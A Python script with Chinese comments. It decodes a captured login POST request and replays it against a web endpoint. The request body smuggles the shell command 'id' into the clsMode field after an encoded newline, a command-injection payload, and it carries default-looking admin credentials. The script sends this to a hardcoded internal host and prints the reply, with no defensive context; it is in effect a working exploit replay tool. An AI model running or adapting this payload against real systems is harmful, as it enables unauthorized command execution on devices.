from urllib.parse import unquote
import json
import requests


# 原始的POST请求字符串（已省略换行符以适应单行显示）
raw_request="POST%20%2Frep%2Flogin%3F_ZQA_ID%3D6261931ad4444a01%26%20HTTP%2F1.1%0AHost%3A%2061.178.74.236%0AUser-Agent%3A%20Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F92.0.4515.159%20Safari%2F537.36%0AAccept-Encoding%3A%20gzip%2C%20deflate%2C%20zstd%0AAccept%3A%20%2A%2F%2A%0AConnection%3A%20keep-alive%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0AContent-Length%3A%20118%0A%0AclsMode%3Dcls_mode_login%250Aid%250A%26index%3Dindex%26log_type%3Dreport%26loginType%3Daccount%26page%3Dlogin%26rnd%3D0%26userID%3Dadmin%26userPsw%3D123"
# 解码URL编码的字符
decoded_request = unquote(raw_request)

# 分离请求头和请求体
header_body_split = decoded_request.split('\r\n\r\n') if '\r\n\r\n' in decoded_request else decoded_request.split('\n\n')
headers_str = header_body_split[0]
body_str = header_body_split[1] if len(header_body_split) > 1 else ''

# 解析请求头
headers = {}
for line in headers_str.splitlines():
    if ': ' in line:
        key, value = line.split(': ', 1)
        headers[key] = value

# 解析请求体
# 注意：这里假设请求体是JSON或类似结构化的数据，如果不是，则需要根据实际格式调整解析方法
try:
    body = json.loads(body_str)
except json.JSONDecodeError:
    # 如果不是JSON格式，直接使用原始字符串
    body = body_str

# 输出解析结果
print("Headers:")
print(headers)
print("\nBody:")
print(body)


# 假设我们已经得到了解析后的headers和body

# 解析后的请求头（来自之前的解析）



#
# 构造HTTP请求行
http_method = "POST"
path = "/saas./resttosaasservlet?_ZQA_ID=086f88f181404250&"
http_version = "HTTP/1.1"

request_line = f"{http_method} {path} {http_version}\r\n"

# 构造HTTP头部
header_lines = ''.join(f"{key}: {value}\r\n" for key, value in headers.items())

# 构造完整的HTTP请求
http_request = f"{request_line}{header_lines}\r\n{body_str}"

# 打印HTTP请求
print(http_request)





try:
    response = requests.post(
        url=f"http://10.50.81.44:8000{path}",
        headers=headers,
        data=body_str
    )
    print("Response Status Code:", response.status_code)
    print("Response Body:", response.text)
except Exception as e:
    print("An error occurred:", e)